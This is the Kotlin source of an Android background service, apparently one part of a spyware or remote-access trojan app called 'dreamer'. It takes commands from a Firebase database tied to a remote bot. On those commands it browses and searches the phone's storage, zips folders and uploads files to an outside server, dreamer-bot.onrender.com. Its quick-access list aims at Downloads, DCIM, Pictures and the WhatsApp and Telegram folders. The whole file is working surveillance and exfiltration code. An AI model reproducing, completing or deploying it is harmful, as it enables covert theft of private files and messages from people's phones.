package com.h4k3r.dreamer

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.StatFs
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.gson.Gson
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileInputStream
import java.nio.charset.StandardCharsets
import java.text.SimpleDateFormat
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class FilesService : Service() {
    companion object {
        private const val TAG = "FilesService"
    }

    /* ── Authentication ─────────────────────────── */
    private lateinit var secretKey: String
    private lateinit var deviceId: String
    private lateinit var deviceRef: DatabaseReference
    private var authRetryCount = 0
    private val maxAuthRetries = 10

    /* ── Configuration ──────────────────────────── */
    private val server = "https://dreamer-bot.onrender.com"
    private val pageSize = 15
    private val maxFileSize = 50 * 1024 * 1024 // 50MB

    /* ── HTTP & Coroutines ──────────────────────── */
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val http = OkHttpClient.Builder()
        .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .writeTimeout(120, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    private val gson = Gson()

    /* ── Path Encoding ──────────────────────────── */
    private val keyMap = mutableMapOf<String, String>()
    private val MAX_KEY_LENGTH = 55

    private fun b64Encode(s: String): String =
        android.util.Base64.encodeToString(
            s.toByteArray(StandardCharsets.UTF_8),
            android.util.Base64.URL_SAFE or android.util.Base64.NO_WRAP
        )

    private fun b64Decode(b: String): String =
        String(
            android.util.Base64.decode(b, android.util.Base64.URL_SAFE),
            StandardCharsets.UTF_8
        )

    private fun createShortKey(path: String): String {
        val encoded = b64Encode(path)
        return if (encoded.length <= MAX_KEY_LENGTH) {
            encoded
        } else {
            // Use hash for long paths
            val key = path.hashCode().toUInt().toString(16)
            keyMap[key] = path
            key
        }
    }

    private fun resolvePath(key: String): String =
        when (key) {
            "root" -> Environment.getExternalStorageDirectory().absolutePath
            else -> keyMap[key] ?: try { b64Decode(key) } catch (e: Exception) { "" }
        }

    /* ── Common Directories ─────────────────────── */
    private val quickAccessDirs = listOf(
        "Downloads" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
        "Documents" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
        "Pictures" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
        "DCIM" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
        "WhatsApp" to File(Environment.getExternalStorageDirectory(), "WhatsApp"),
        "Telegram" to File(Environment.getExternalStorageDirectory(), "Telegram")
    )

    /* ── Service Lifecycle ──────────────────────── */
    override fun onCreate() {
        super.onCreate()

        // Load authentication
        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        secretKey = prefs.getString("secret_key", "") ?: ""
        deviceId = prefs.getString("device_id", "") ?: ""

        if (secretKey.isEmpty() || deviceId.isEmpty()) {
            authRetryCount++
            if (authRetryCount > maxAuthRetries) {
                Log.e(TAG, "Missing authentication, max retries reached. Stopping service.")
                stopSelf()
                return
            }
            Log.e(TAG, "Missing authentication, will retry in 5 seconds (attempt $authRetryCount)")
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                onCreate()
            }, 5000)
            return
        } else {
            authRetryCount = 0 // reset on success
        }

        Log.d(TAG, "Service started - Key: ${secretKey.take(6)}..., Device: $deviceId")

        // Check storage permission
        if (!hasStoragePermission()) {
            Log.w(TAG, "Storage permission denied - stopping service")
            stopSelf()
            return
        }

        // Initialize Firebase reference
        deviceRef = Firebase.database.reference
            .child("devices")
            .child(secretKey)
            .child(deviceId)

        listenFirebase()
    }

    /* ── Permission Check ───────────────────────── */
    private fun hasStoragePermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            androidx.core.content.ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_MEDIA_IMAGES
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        } else {
            androidx.core.content.ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    /* ── Firebase Listener ──────────────────────── */
    private fun listenFirebase() {
        deviceRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val cmd = snapshot.child("command").getValue(String::class.java) ?: return
                val chatId = snapshot.child("chat").getValue(Long::class.java) ?: 0L
                val msgId = snapshot.child("msg").getValue(Long::class.java) ?: 0L

                Log.d(TAG, "Command: $cmd")

                when {
                    cmd == "file_root" -> showRootDirectory(chatId, msgId)
                    cmd == "file_quick" -> showQuickAccess(chatId, msgId)
                    cmd == "file_storage" -> showStorageInfo(chatId, msgId)

                    cmd.startsWith("filepage_") -> {
                        val parts = cmd.removePrefix("filepage_").split("_", limit = 2)
                        if (parts.size == 2) {
                            val baseKey = parts[0]
                            val page = parts[1].toIntOrNull() ?: 0
                            listDirectory(File(resolvePath(baseKey)), chatId, msgId, page)
                        }
                    }

                    cmd.startsWith("file_") -> {
                        val pathKey = cmd.removePrefix("file_")
                        listDirectory(File(resolvePath(pathKey)), chatId, msgId, 0)
                    }

                    cmd.startsWith("fileget_") -> {
                        val pathKey = cmd.removePrefix("fileget_")
                        sendFile(File(resolvePath(pathKey)), chatId)
                    }

                    cmd.startsWith("fileinfo_") -> {
                        val pathKey = cmd.removePrefix("fileinfo_")
                        sendFileInfo(File(resolvePath(pathKey)), chatId, msgId)
                    }

                    cmd.startsWith("filezip_") -> {
                        val pathKey = cmd.removePrefix("filezip_")
                        createAndSendZip(File(resolvePath(pathKey)), chatId)
                    }

                    cmd.startsWith("filesearch_") -> {
                        val query = cmd.removePrefix("filesearch_")
                        searchFiles(query, chatId, msgId)
                    }
                }

                snapshot.child("command").ref.setValue(null)
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase error", error.toException())
            }
        })
    }

    /* ── Root Directory View ────────────────────── */
    private fun showRootDirectory(chatId: Long, msgId: Long) {
        val rootDir = Environment.getExternalStorageDirectory()
        listDirectory(rootDir, chatId, msgId, 0, isRoot = true)
    }

    /* ── Quick Access Menu ──────────────────────── */
    private fun showQuickAccess(chatId: Long, msgId: Long) {
        val items = quickAccessDirs.mapNotNull { (name, file) ->
            if (file.exists() && file.canRead()) {
                val fileCount = file.listFiles()?.size ?: 0
                mapOf(
                    "name" to "📁 $name ($fileCount items)",
                    "path" to createShortKey(file.absolutePath),
                    "isQuick" to true
                )
            } else null
        }

        val body = mapOf(
            "chat_id" to chatId,
            "msg_id" to msgId,
            "type" to "quick_access",
            "items" to items
        )

        postJson("/json/filelist", gson.toJson(body))
    }

    /* ── Storage Information ────────────────────── */
    private fun showStorageInfo(chatId: Long, msgId: Long) {
        val stat = StatFs(Environment.getExternalStorageDirectory().path)
        val blockSize = stat.blockSizeLong
        val totalBlocks = stat.blockCountLong
        val availableBlocks = stat.availableBlocksLong

        val totalBytes = totalBlocks * blockSize
        val availableBytes = availableBlocks * blockSize
        val usedBytes = totalBytes - availableBytes

        val info = mapOf(
            "chat_id" to chatId,
            "msg_id" to msgId,
            "type" to "storage_info",
            "total" to formatFileSize(totalBytes),
            "used" to formatFileSize(usedBytes),
            "available" to formatFileSize(availableBytes),
            "percent_used" to ((usedBytes.toFloat() / totalBytes) * 100).toInt()
        )

        postJson("/json/storage_info", gson.toJson(info))
    }

    /* ── Directory Listing ──────────────────────── */
    private fun listDirectory(dir: File, chatId: Long, msgId: Long, page: Int, isRoot: Boolean = false) {
        Log.d(TAG, "Listing directory: ${dir.absolutePath}, page: $page")

        if (!dir.exists() || !dir.canRead()) {
            sendError(chatId, "Cannot read directory: ${dir.name}")
            return
        }

        scope.launch {
            try {
                val allFiles = dir.listFiles()?.toList() ?: emptyList()

                // Sort: directories first, then by name
                val sorted = allFiles.sortedWith(compareBy(
                    { !it.isDirectory },
                    { it.name.lowercase() }
                ))

                val totalPages = (sorted.size + pageSize - 1) / pageSize
                val pageItems = sorted.drop(page * pageSize).take(pageSize)

                val items = pageItems.map { file ->
                    mapOf(
                        "name" to file.name,
                        "dir" to file.isDirectory,
                        "path" to createShortKey(file.absolutePath),
                        "size" to if (file.isFile) formatFileSize(file.length()) else null,
                        "modified" to SimpleDateFormat("MMM dd, HH:mm", Locale.US)
                            .format(Date(file.lastModified())),
                        "icon" to getFileIcon(file)
                    )
                }

                val pathDisplay = when {
                    isRoot -> "Internal Storage"
                    dir.absolutePath.startsWith("/storage/emulated/0") ->
                        dir.absolutePath.replace("/storage/emulated/0", "Internal")
                    else -> dir.absolutePath
                }

                val body = mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "base" to createShortKey(dir.absolutePath),
                    "page" to page,
                    "total" to totalPages,
                    "items" to items,
                    "path_display" to pathDisplay,
                    "item_count" to allFiles.size,
                    "type" to "directory_list"
                )

                postJson("/json/filelist", gson.toJson(body))

            } catch (e: Exception) {
                Log.e(TAG, "List directory error", e)
                sendError(chatId, "Failed to list directory: ${e.message}")
            }
        }
    }

    /* ── File Information ───────────────────────── */
    private fun sendFileInfo(file: File, chatId: Long, msgId: Long) {
        if (!file.exists()) {
            sendError(chatId, "File not found")
            return
        }

        val info = mutableMapOf(
            "name" to file.name,
            "path" to file.absolutePath,
            "size" to formatFileSize(file.length()),
            "size_bytes" to file.length(),
            "modified" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                .format(Date(file.lastModified())),
            "is_directory" to file.isDirectory,
            "readable" to file.canRead(),
            "writable" to file.canWrite(),
            "hidden" to file.isHidden
        )

        if (file.isDirectory) {
            val children = file.listFiles()
            info["item_count"] = children?.size ?: 0
            info["subdirs"] = children?.count { it.isDirectory } ?: 0
            info["files"] = children?.count { it.isFile } ?: 0
        } else {
            info["extension"] = file.extension
            info["mime_type"] = getMimeType(file)
        }

        val body = mapOf(
            "chat_id" to chatId,
            "msg_id" to msgId,
            "type" to "file_info",
            "info" to info
        )

        postJson("/json/file_info", gson.toJson(body))
    }

    /* ── Send File ──────────────────────────────── */
    private fun sendFile(file: File, chatId: Long) = scope.launch {
        Log.d(TAG, "Sending file: ${file.absolutePath}")

        if (!file.exists() || !file.isFile) {
            sendError(chatId, "File not found or is a directory")
            return@launch
        }

        if (file.length() > maxFileSize) {
            sendError(chatId, "File too large: ${formatFileSize(file.length())}. Max: ${formatFileSize(maxFileSize.toLong())}")
            return@launch
        }

        try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("name", file.name)
                .addFormDataPart("blob", file.name, file.asRequestBody())
                .addFormDataPart("size", formatFileSize(file.length()))
                .addFormDataPart("modified", SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
                    .format(Date(file.lastModified())))
                .build()

            val request = Request.Builder()
                .url("$server/file")
                .header("X-Auth", "$secretKey:$deviceId")
                .post(body)
                .build()

            http.newCall(request).execute().use { response ->
                Log.d(TAG, "File upload response: ${response.code}")
                if (!response.isSuccessful) {
                    sendError(chatId, "Upload failed: ${response.code}")
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "File upload error", e)
            sendError(chatId, "Failed to send file: ${e.message}")
        }
    }

    /* ── Create and Send ZIP ────────────────────── */
    private fun createAndSendZip(dir: File, chatId: Long) = scope.launch {
        if (!dir.exists() || !dir.isDirectory) {
            sendError(chatId, "Invalid directory for ZIP")
            return@launch
        }

        try {
            sendStatus(chatId, "Creating ZIP archive...")

            val zipFile = File(cacheDir, "${dir.name}_${System.currentTimeMillis()}.zip")
            ZipOutputStream(zipFile.outputStream()).use { zos ->
                dir.walkTopDown().forEach { file ->
                    if (file.isFile && file.canRead()) {
                        val entryName = file.relativeTo(dir).path
                        zos.putNextEntry(ZipEntry(entryName))
                        FileInputStream(file).use { it.copyTo(zos) }
                        zos.closeEntry()
                    }
                }
            }

            if (zipFile.length() > maxFileSize) {
                sendError(chatId, "ZIP too large: ${formatFileSize(zipFile.length())}")
                zipFile.delete()
                return@launch
            }

            // Send the ZIP file
            sendFile(zipFile, chatId)

            // Clean up
            zipFile.delete()

        } catch (e: Exception) {
            Log.e(TAG, "ZIP creation error", e)
            sendError(chatId, "Failed to create ZIP: ${e.message}")
        }
    }

    /* ── Search Files ───────────────────────────── */
    private fun searchFiles(query: String, chatId: Long, msgId: Long) = scope.launch {
        if (query.length < 2) {
            sendError(chatId, "Search query too short")
            return@launch
        }

        sendStatus(chatId, "Searching for: $query")

        val results = mutableListOf<File>()
        val rootDir = Environment.getExternalStorageDirectory()

        try {
            rootDir.walkTopDown()
                .filter { it.name.contains(query, ignoreCase = true) }
                .take(50) // Limit results
                .forEach { results.add(it) }

            val items = results.map { file ->
                mapOf(
                    "name" to file.name,
                    "dir" to file.isDirectory,
                    "path" to createShortKey(file.absolutePath),
                    "size" to if (file.isFile) formatFileSize(file.length()) else null,
                    "parent" to file.parentFile?.name,
                    "icon" to getFileIcon(file)
                )
            }

            val body = mapOf(
                "chat_id" to chatId,
                "msg_id" to msgId,
                "type" to "search_results",
                "query" to query,
                "results" to items,
                "count" to items.size
            )

            postJson("/json/file_search", gson.toJson(body))

        } catch (e: Exception) {
            Log.e(TAG, "Search error", e)
            sendError(chatId, "Search failed: ${e.message}")
        }
    }

    /* ── Helper Functions ───────────────────────── */
    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            bytes < 1024 * 1024 * 1024 -> "${bytes / (1024 * 1024)} MB"
            else -> "%.2f GB".format(bytes / (1024.0 * 1024 * 1024))
        }
    }

    private fun getFileIcon(file: File): String {
        return when {
            file.isDirectory -> "📁"
            file.extension.lowercase() in listOf("jpg", "jpeg", "png", "gif", "bmp") -> "🖼️"
            file.extension.lowercase() in listOf("mp4", "avi", "mkv", "mov") -> "🎥"
            file.extension.lowercase() in listOf("mp3", "wav", "flac", "aac") -> "🎵"
            file.extension.lowercase() in listOf("pdf") -> "📕"
            file.extension.lowercase() in listOf("doc", "docx") -> "📄"
            file.extension.lowercase() in listOf("xls", "xlsx") -> "📊"
            file.extension.lowercase() in listOf("zip", "rar", "7z") -> "🗜️"
            file.extension.lowercase() in listOf("apk") -> "📱"
            file.extension.lowercase() in listOf("txt", "log") -> "📝"
            else -> "📄"
        }
    }

    private fun getMimeType(file: File): String {
        return when (file.extension.lowercase()) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "pdf" -> "application/pdf"
            "mp4" -> "video/mp4"
            "mp3" -> "audio/mpeg"
            "apk" -> "application/vnd.android.package-archive"
            "zip" -> "application/zip"
            "txt" -> "text/plain"
            else -> "application/octet-stream"
        }
    }

    private fun sendStatus(chatId: Long, message: String) {
        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "type" to "status",
            "message" to message
        ))
        postJson("/json/file_status", json)
    }

    private fun sendError(chatId: Long, error: String) {
        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "type" to "error",
            "error" to error
        ))
        postJson("/json/file_status", json)
    }

    private fun postJson(path: String, json: String) = scope.launch {
        try {
            val request = Request.Builder()
                .url(server + path)
                .header("X-Auth", "$secretKey:$deviceId")
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()

            http.newCall(request).execute().use { response ->
                Log.d(TAG, "POST $path: ${response.code}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network error", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}